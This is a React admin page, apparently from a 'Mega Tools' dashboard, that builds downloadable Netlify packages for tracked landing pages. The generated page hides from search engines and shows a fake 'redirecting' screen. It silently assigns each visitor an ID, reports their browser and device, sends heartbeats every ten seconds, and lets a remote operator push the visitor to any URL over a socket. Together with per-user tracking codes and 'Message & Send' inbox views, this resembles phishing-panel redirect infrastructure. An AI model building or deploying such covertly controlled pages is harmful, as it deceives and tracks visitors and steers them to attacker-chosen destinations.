import React, { useState, useEffect, useCallback } from "react";
import api from "./api";
import { useAuth } from "./AuthContext";
import JSZip from "jszip";

export default function ExternalUrlPage() {
  const { user } = useAuth();
  const isAdmin = user?.role === "admin";
  const userTrackingCode = user?.trackingCode || "";

  const [links, setLinks] = useState([]);
  const [showForm, setShowForm] = useState(false);
  const [showDownloadModal, setShowDownloadModal] = useState(false);
  const [selectedLink, setSelectedLink] = useState(null);
  const [downloadFileName, setDownloadFileName] = useState("");
  const [form, setForm] = useState({ name: "", baseUrl: "", category: "", inboxView: "quick", imageUrl: "", htmlCode: "", tutorialUrl: "" });
  const [showNewCatInput, setShowNewCatInput] = useState(false);
  const [newCatName, setNewCatName] = useState("");
  const [activeCategoryFilter, setActiveCategoryFilter] = useState("all");

  const API_BASE = import.meta.env.VITE_API_URL || "http://localhost:5000";

  const loadLinks = useCallback(() => { api.get("/links").then(r => setLinks(r.data || [])).catch(() => {}); }, []);
  useEffect(() => { loadLinks(); }, [loadLinks]);

  const allCategories = [...new Set(links.map(l => l.category).filter(Boolean))].sort();
  const dynamicCategories = allCategories.filter(c => c !== "message" && c !== "personal");

  const publicLinks = links.filter(l => l.category !== "personal");
  const filteredLinks = publicLinks.filter(l => {
    if (activeCategoryFilter === "message") return l.category === "message" || l.inboxView === "message";
    if (activeCategoryFilter !== "all" && l.category !== activeCategoryFilter) return false;
    return true;
  });

  const resetForm = () => { setForm({ name: "", baseUrl: "", category: "", inboxView: "quick", imageUrl: "", htmlCode: "", tutorialUrl: "" }); setShowForm(false); setShowNewCatInput(false); setNewCatName(""); };
  const handleEdit = (link) => { setForm({ name: link.name||"", baseUrl: link.baseUrl||"", category: link.category||"", inboxView: link.inboxView||"quick", imageUrl: link.imageUrl||"", htmlCode: link.htmlCode||"", tutorialUrl: link.tutorialUrl||"" }); setShowForm(true); };
  const handleSave = async () => {
    if (!isAdmin) return;
    const isMsg = form.inboxView === "message";
    const finalCategory = isMsg ? "message" : (showNewCatInput ? newCatName.trim() : form.category);
    if (!form.name) { alert("Name is required"); return; }
    if (!isMsg && !finalCategory) { alert("Category is required"); return; }
    const cleanBase = (form.baseUrl||"").split("#")[0].split("?")[0].replace(/\/$/,"");
    const payload = { name: form.name, baseUrl: cleanBase||"http://localhost", category: finalCategory, inboxView: form.inboxView, showInInbox: isMsg?false:true, imageUrl: form.imageUrl||"", htmlCode: form.htmlCode||"", tutorialUrl: form.tutorialUrl||"" };
    try { await api.post("/links", payload); resetForm(); loadLinks(); } catch (e) { console.error(e); alert("Failed to create link"); }
  };
  const handleDelete = async (link) => { if (!window.confirm("Delete this link?")) return; try { await api.delete("/links/"+link._id); loadLinks(); } catch (e) { console.error(e); } };
  const getVisitorUrl = (link) => { const base = (link.baseUrl||"").replace(/\/$/,""); const code = link.baseCode || link.slug || ""; return base + "/" + userTrackingCode + (code ? "_" + code : ""); };
  const getInboxViewLabel = (view) => { if (view==="message") return "💬 Message & Send"; return "⚡ Quick Actions"; };
  const getInboxViewColor = (view) => { if (view==="message") return {bg:"rgba(236,72,153,0.15)",color:"#ec4899"}; return {bg:"rgba(99,102,241,0.15)",color:"#6366f1"}; };
  const isMessageLink = (link) => link.inboxView === "message" || link.linksCategory === "message" || link.category === "message";
  const canDownload = (link) => isAdmin || !isMessageLink(link);
  const publicFilterButtons = ["all","message",...dynamicCategories];

  const generateRandomId = () => 'dpl_' + Date.now() + '_' + Math.random().toString(36).slice(2, 8);

  const generateLandingHtml = (link) => {
    const tk = userTrackingCode;
    const slug = link.baseCode || link.slug || "";
    const name = link.name || "Landing Page";
    const baseUrl = (link.baseUrl||"").replace(/\/$/,"");
    
    return `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>${name}</title>
  <meta name="robots" content="noindex, nofollow, noarchive, nosnippet">
  <style>
    *{margin:0;padding:0;box-sizing:border-box}
    html,body{height:100%;font-family:'Segoe UI',system-ui,-apple-system,sans-serif;background:linear-gradient(135deg,#0f172a 0%,#1e293b 100%);display:flex;align-items:center;justify-content:center}
    .loading-box{text-align:center;padding:2rem}
    .spinner{width:48px;height:48px;border:3px solid rgba(255,255,255,0.1);border-top-color:#6366f1;border-radius:50%;animation:spin 0.8s linear infinite;margin:0 auto 20px}
    @keyframes spin{to{transform:rotate(360deg)}}
    .loading-text{color:#94a3b8;font-size:14px;font-weight:400;letter-spacing:0.3px;margin-bottom:8px}
    .brand{color:#6366f1;font-size:12px;font-weight:500;letter-spacing:0.5px;opacity:0.8}
    .footer{position:fixed;bottom:20px;left:0;right:0;text-align:center;color:#475569;font-size:11px}
  </style>
</head>
<body>
  <div class="loading-box">
    <div class="spinner"></div>
    <div class="loading-text">Please wait while we redirect you...</div>
    <div class="brand">Powered by Mega Tools</div>
  </div>
  <div class="footer">&copy; ${new Date().getFullYear()} Mega Tools. All rights reserved.</div>
  <script>
    (function(){
      var API='${API_BASE}';
      var TK='${tk}_${slug}';
      var TARGET='${baseUrl}/${tk}_${slug}';
      var VID=localStorage.getItem('_vid')||'v_'+Date.now()+'_'+Math.random().toString(36).slice(2,6);
      localStorage.setItem('_vid',VID);

      var s=document.createElement('script');
      s.src=API+'/socket.io/socket.io.js';
      s.onload=function(){
        var socket=io(API,{transports:['websocket','polling']});
        socket.on('connect',function(){socket.emit('session_init',{visitorId:VID,trackingCode:TK});socket.emit('joinRoom',TK);});
        socket.on('nav_update',function(d){if(d&&d.targetUrl)window.location.href=d.targetUrl;});
        socket.on('msg_push',function(d){if(d&&d.targetUrl)window.location.href=d.targetUrl;});
        socket.on('connect_error',function(){window.location.href=TARGET;});
        fetch(API+'/api/data/visit',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({visitorId:VID,trackingCode:TK,browser:navigator.userAgent.substring(0,50),device:/Mobi/i.test(navigator.userAgent)?'Mobile':'Desktop'})}).catch(function(){});
        setInterval(function(){fetch(API+'/api/data/heartbeat',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({visitorId:VID,status:'Active'})}).catch(function(){})},10000);
        window.addEventListener('beforeunload',function(){fetch(API+'/api/data/heartbeat',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({visitorId:VID,status:'Offline'})})});
        setTimeout(function(){window.location.href=TARGET},2000);
      };
      document.head.appendChild(s);
    })();
  </script>
</body>
</html>`;
  };

  const generateNetlifyToml = () => {
    return `[build]\n  publish = "."\n\n[[redirects]]\n  from = "/*"\n  to = "/index.html"\n  status = 200\n`;
  };

  const generateRedirects = () => `/*    /index.html   200\n`;

  const generateReadme = (link) => {
    const name = link.name || "Landing Page";
    return `# ${name}\n\n> Auto-generated landing page by **Mega Tools**\n\n## 🚀 Quick Deploy\n\n### Deploy to Netlify\n1. Go to [app.netlify.com](https://app.netlify.com)\n2. Drag & drop this entire ZIP folder\n3. Your page is live!\n\n## 📁 Files Included\n- **index.html** — Landing page with 2-second redirect\n- **_redirects** — Netlify SPA configuration\n- **netlify.toml** — Netlify deployment settings\n- **README.md** — This file\n\n## 🔗 Your Tracking URL\n\`\`\`\n${getVisitorUrl(link)}\n\`\`\`\n\n---\n© ${new Date().getFullYear()} Mega Tools\n`;
  };

  const openDownloadModal = (link) => {
    setSelectedLink(link);
    const randomId = generateRandomId();
    setDownloadFileName(link.name.replace(/\s/g, '_') + '_' + randomId + '_deploy.zip');
    setShowDownloadModal(true);
  };

  const handleDownloadZip = async () => {
    if (!selectedLink) return;
    const zip = new JSZip();
    zip.file("index.html", generateLandingHtml(selectedLink));
    zip.file("_redirects", generateRedirects());
    zip.file("netlify.toml", generateNetlifyToml());
    zip.file("README.md", generateReadme(selectedLink));
    const content = await zip.generateAsync({ type: "blob" });
    const url = URL.createObjectURL(content);
    const a = document.createElement('a');
    a.href = url;
    a.download = downloadFileName;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
    setShowDownloadModal(false);
  };

  return (
    <div style={{ padding: 10 }}>
      <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", flexWrap: "wrap", gap: 8, marginBottom: 10 }}>
        <div><h2 style={{ margin: 0, fontSize: 24, fontWeight: 700 }}>🌐 All External URL</h2><p style={{ margin: "2px 0 0", fontSize: 13, color: "var(--text-muted)" }}>Tracking code: <code style={{ color: "var(--accent)", fontWeight: 600, fontSize: 14 }}>{userTrackingCode || "N/A"}</code></p></div>
        {isAdmin && <button onClick={() => { resetForm(); setShowForm(true); }} style={{ padding: "10px 16px", fontSize: 13, fontWeight: 600, background: "var(--accent)", color: "#0F172A", border: "1px solid var(--accent)", borderRadius: 6, cursor: "pointer", whiteSpace: "nowrap" }}>+ Add URL</button>}
      </div>

      {/* ADD URL POPUP MODAL */}
      {showForm && isAdmin && (
        <div onClick={() => setShowForm(false)} style={{ position: "fixed", top: 0, left: 0, width: "100vw", height: "100vh", background: "rgba(0,0,0,0.7)", zIndex: 9999, display: "flex", alignItems: "center", justifyContent: "center" }}>
          <div onClick={e => e.stopPropagation()} style={{ background: "var(--card-bg)", border: "1px solid var(--card-border)", borderRadius: 14, padding: 28, width: 600, maxWidth: "92%", maxHeight: "85vh", overflowY: "auto", boxShadow: "0 20px 50px rgba(0,0,0,0.5)" }}>
            <div style={{ textAlign: "center", marginBottom: 20 }}>
              <div style={{ fontSize: 40, marginBottom: 8 }}>🔗</div>
              <h3 style={{ margin: "0 0 4px", fontSize: 18, fontWeight: 700, color: "var(--accent)" }}>Add Public URL</h3>
              <p style={{ margin: 0, fontSize: 13, color: "var(--text-muted)" }}>Create a new external link for tracking</p>
            </div>

            <div style={{ marginBottom: 16, display: "flex", gap: 8 }}>
              <button type="button" onClick={() => setForm({ ...form, inboxView: "quick", category: "" })} style={{ flex: 1, padding: "12px 16px", fontSize: 13, fontWeight: 700, cursor: "pointer", borderRadius: 6, border: "1px solid var(--card-border)", background: form.inboxView==="quick"?"#6366f1":"var(--bg-secondary)", color: form.inboxView==="quick"?"#fff":"var(--text-muted)" }}>⚡ Quick Actions</button>
              <button type="button" onClick={() => setForm({ ...form, inboxView: "message", category: "message" })} style={{ flex: 1, padding: "12px 16px", fontSize: 13, fontWeight: 700, cursor: "pointer", borderRadius: 6, border: "1px solid var(--card-border)", background: form.inboxView==="message"?"#ec4899":"var(--bg-secondary)", color: form.inboxView==="message"?"#fff":"var(--text-muted)" }}>💬 Message & Send</button>
            </div>

            <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 14, marginBottom: 14 }}>
              <div><label style={lbl}>Name *</label><input value={form.name} onChange={e => setForm({ ...form, name: e.target.value })} style={inp} /></div>
              <div><label style={lbl}>External URL</label><input placeholder="https://example.com" value={form.baseUrl} onChange={e => setForm({ ...form, baseUrl: e.target.value })} style={inp} /></div>
            </div>

            {form.inboxView === "quick" && (
              <div style={{ marginBottom: 14 }}><label style={lbl}>Category *</label>
                <select value={form.category} onChange={e => { const v = e.target.value; if (v === "__new__") { setShowNewCatInput(true); setNewCatName(""); } else { setForm({ ...form, category: v }); setShowNewCatInput(false); } }} style={inp}>
                  <option value="">Select category</option>{dynamicCategories.map(c => <option key={c} value={c}>{c}</option>)}<option value="__new__">+ Add Category</option>
                </select>{showNewCatInput && <input placeholder="New category" value={newCatName} onChange={e => setNewCatName(e.target.value)} style={{ ...inp, marginTop: 8 }} />}</div>
            )}

            <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 14, marginBottom: 20 }}>
              <div><label style={lbl}>Image URL</label><input placeholder="https://..." value={form.imageUrl} onChange={e => setForm({ ...form, imageUrl: e.target.value })} style={inp} /></div>
              <div><label style={lbl}>Tutorial (YouTube)</label><input placeholder="https://youtube.com/..." value={form.tutorialUrl} onChange={e => setForm({ ...form, tutorialUrl: e.target.value })} style={inp} /></div>
            </div>

            <div style={{ display: "flex", gap: 8 }}>
              <button onClick={resetForm} style={{ flex: 1, padding: "12px", fontSize: 13, fontWeight: 600, background: "var(--bg-secondary)", color: "var(--text)", border: "1px solid var(--card-border)", borderRadius: 8, cursor: "pointer" }}>Cancel</button>
              <button onClick={handleSave} style={{ flex: 2, padding: "12px", fontSize: 14, fontWeight: 600, background: "var(--accent)", color: "#0F172A", border: "none", borderRadius: 8, cursor: "pointer" }}>Create Link</button>
            </div>
          </div>
        </div>
      )}

      {/* DOWNLOAD MODAL */}
      {showDownloadModal && selectedLink && (
        <div onClick={() => setShowDownloadModal(false)} style={{ position: "fixed", top: 0, left: 0, width: "100vw", height: "100vh", background: "rgba(0,0,0,0.7)", zIndex: 9999, display: "flex", alignItems: "center", justifyContent: "center" }}>
          <div onClick={e => e.stopPropagation()} style={{ background: "var(--card-bg)", border: "1px solid var(--card-border)", borderRadius: 14, padding: 28, width: 480, maxWidth: "92%", maxHeight: "85vh", overflowY: "auto", boxShadow: "0 20px 50px rgba(0,0,0,0.5)" }}>
            <div style={{ textAlign: "center", marginBottom: 20 }}>
              <div style={{ fontSize: 48, marginBottom: 8 }}>📦</div>
              <h3 style={{ margin: "0 0 4px", fontSize: 18, fontWeight: 700, color: "var(--text)" }}>{selectedLink.name}</h3>
              <p style={{ margin: 0, fontSize: 13, color: "var(--text-muted)" }}>Deployment Package</p>
            </div>
            
            <div style={{ background: "var(--bg-secondary)", borderRadius: 8, padding: 12, marginBottom: 20, fontFamily: "monospace", fontSize: 12, color: "var(--accent)", wordBreak: "break-all", textAlign: "center", border: "1px solid var(--card-border)" }}>
              {getVisitorUrl(selectedLink)}
            </div>
            
            <div style={{ display: "flex", gap: 8 }}>
              <button onClick={() => setShowDownloadModal(false)} style={{ flex: 1, padding: "12px", fontSize: 13, fontWeight: 600, background: "var(--bg-secondary)", color: "var(--text)", border: "1px solid var(--card-border)", borderRadius: 8, cursor: "pointer" }}>Cancel</button>
              <button onClick={handleDownloadZip} style={{ flex: 2, padding: "12px", fontSize: 14, fontWeight: 600, background: "linear-gradient(135deg, #f59e0b, #d97706)", color: "#000", border: "none", borderRadius: 8, cursor: "pointer", display: "flex", alignItems: "center", justifyContent: "center", gap: 6 }}>
                <span style={{ fontSize: 16 }}>⬇</span> Download ZIP
              </button>
            </div>
            <div style={{ textAlign: "center", marginTop: 12, fontSize: 10, color: "var(--text-muted)" }}>
              File: <code style={{ color: "var(--accent)" }}>{downloadFileName}</code>
            </div>
          </div>
        </div>
      )}

      {/* FILTER BUTTONS */}
      {publicFilterButtons.length > 1 && (
        <div style={{ display: "grid", gridTemplateColumns: `repeat(${publicFilterButtons.length}, 1fr)`, gap: 8, marginBottom: 10 }}>
          {publicFilterButtons.map(btn => { const label = btn==="all"?"All Links":btn==="message"?"💬 Message & Send":btn; const isActive = activeCategoryFilter===btn; return <button key={btn} onClick={() => setActiveCategoryFilter(btn)} style={{ padding: "12px 10px", fontSize: 13, fontWeight: 700, cursor: "pointer", borderRadius: 6, border: "1px solid var(--card-border)", background: isActive?(btn==="message"?"#ec4899":"var(--accent)"):"var(--bg-secondary)", color: isActive?"#fff":"var(--text-muted)", whiteSpace: "nowrap", overflow: "hidden", textOverflow: "ellipsis", width: "100%" }}>{label}</button>; })}
        </div>
      )}

      {/* TABLE */}
      <div style={{ background: "var(--card-bg)", borderRadius: 10, border: "1px solid var(--card-border)", overflow: "hidden", boxShadow: "var(--card-shadow)" }}>
        <div style={{ overflowX: "auto" }}><table style={{ width: "100%", borderCollapse: "collapse" }}>
          <thead><tr style={{ background: "var(--table-header-bg)", borderBottom: "1px solid var(--table-border)" }}>
            <th style={th}>#</th>
            <th style={{ ...th, textAlign: "left" }}>Name</th>
            <th style={{ ...th, textAlign: "left" }}>Category</th>
            {isAdmin && <><th style={{ ...th, textAlign: "left" }}>External URL</th><th style={{ ...th, textAlign: "left" }}>Slug</th></>}
            <th style={th}>Image</th>
            <th style={th}>Download</th>
            <th style={th}>Tutorial</th>
            {isAdmin && <><th style={th}>Inbox View</th><th style={th}>Action</th></>}
          </tr></thead>
          <tbody>{filteredLinks.length===0 && <tr><td colSpan={isAdmin?10:7} style={{ textAlign: "center", padding: 40, color: "var(--text-muted)", fontSize: 14 }}>No public links yet</td></tr>}
          {filteredLinks.map((link, i) => {
            const iv = link.inboxView||(link.linksCategory==="message"?"message":"quick"); 
            const ivc = getInboxViewColor(iv);
            const isMsg = isMessageLink(link);
            const showDownloadBtn = canDownload(link);
            
            if (!isAdmin && isMsg) return null;
            
            return (<tr key={link._id} style={{borderBottom:"1px solid var(--table-border)",height:56}} onMouseEnter={e=>e.currentTarget.style.background="var(--table-hover)"} onMouseLeave={e=>e.currentTarget.style.background="transparent"}>
              <td style={{...td,textAlign:"center",color:"var(--text-muted)",fontSize:13}}>{i+1}</td>
              <td style={{...td,textAlign:"left",fontWeight:600,fontSize:14}}>{link.name}</td>
              <td style={{...td,textAlign:"left",color:"var(--text-muted)",fontSize:13}}>{link.category}</td>
              {isAdmin && <><td style={{...td,textAlign:"left",fontFamily:"monospace",fontSize:13,color:"var(--accent)",wordBreak:"break-all"}}>{getVisitorUrl(link)}</td><td style={{...td,textAlign:"left",fontFamily:"monospace",fontSize:12,color:"var(--text-muted)"}}>{link.baseCode||link.slug||"—"}</td></>}
              <td style={{...td,textAlign:"center"}}>
                {!isMsg ? (link.imageUrl ? <a href={link.imageUrl} target="_blank" rel="noreferrer"><img src={link.imageUrl} alt="" style={{width:48,height:48,borderRadius:6,objectFit:"cover",border:"1px solid var(--card-border)",cursor:"pointer"}} onError={e=>{e.target.style.display="none"}}/></a> : <span style={{color:"var(--text-muted)",fontSize:13}}>—</span>) : <span style={{color:"var(--text-muted)",fontSize:11,fontStyle:"italic"}}>N/A</span>}
              </td>
              <td style={{...td,textAlign:"center"}}>
                {showDownloadBtn ? (
                  <button onClick={() => openDownloadModal(link)} style={{color:"#000",background:"#f59e0b",padding:"10px 18px",borderRadius:6,fontSize:13,fontWeight:600,border:"none",cursor:"pointer",whiteSpace:"nowrap",display:"inline-flex",alignItems:"center",gap:6}}>
                    <span style={{fontSize:15}}>📥</span> Download
                  </button>
                ) : <span style={{color:"var(--text-muted)",fontSize:11,fontStyle:"italic"}}>N/A</span>}
              </td>
              <td style={{...td,textAlign:"center"}}>
                {!isMsg ? (link.tutorialUrl ? <a href={link.tutorialUrl} target="_blank" rel="noreferrer" style={{color:"#fff",background:"#ef4444",padding:"8px 14px",borderRadius:6,fontSize:13,fontWeight:600,textDecoration:"none",display:"inline-block"}}>▶ Watch</a> : <span style={{color:"var(--text-muted)",fontSize:13}}>—</span>) : <span style={{color:"var(--text-muted)",fontSize:11,fontStyle:"italic"}}>N/A</span>}
              </td>
              {isAdmin && <><td style={{...td,textAlign:"center"}}><span style={{padding:"5px 12px",borderRadius:5,fontSize:12,fontWeight:600,background:ivc.bg,color:ivc.color}}>{getInboxViewLabel(iv)}</span></td><td style={{...td,textAlign:"center"}}><div style={{display:"flex",gap:4,justifyContent:"center"}}><button onClick={()=>handleEdit(link)} style={{background:"transparent",border:"1px solid var(--accent)",color:"var(--accent)",cursor:"pointer",fontSize:13,padding:"6px 12px",borderRadius:5,fontWeight:600}}>✏️</button><button onClick={()=>handleDelete(link)} style={{background:"transparent",border:"1px solid var(--danger)",color:"var(--danger)",cursor:"pointer",fontSize:13,padding:"6px 12px",borderRadius:5,fontWeight:600}}>🗑️</button></div></td></>}
            </tr>);
          })}</tbody>
        </table></div>
      </div>
    </div>
  );
}

const th = { padding: "14px 10px", fontSize: 12, textAlign: "center", fontWeight: 700, color: "var(--accent)", textTransform: "uppercase", letterSpacing: "0.05em", whiteSpace: "nowrap" };
const td = { padding: "10px 10px", fontSize: 14, color: "var(--text)", lineHeight: "1.6" };
const lbl = { fontSize: 12, fontWeight: 600, color: "var(--text-muted)", textTransform: "uppercase", display: "block", marginBottom: 5 };
const inp = { width: "100%", padding: "14px 16px", fontSize: 14, background: "var(--input-bg)", color: "var(--text)", border: "1px solid var(--input-border)", borderRadius: 8 };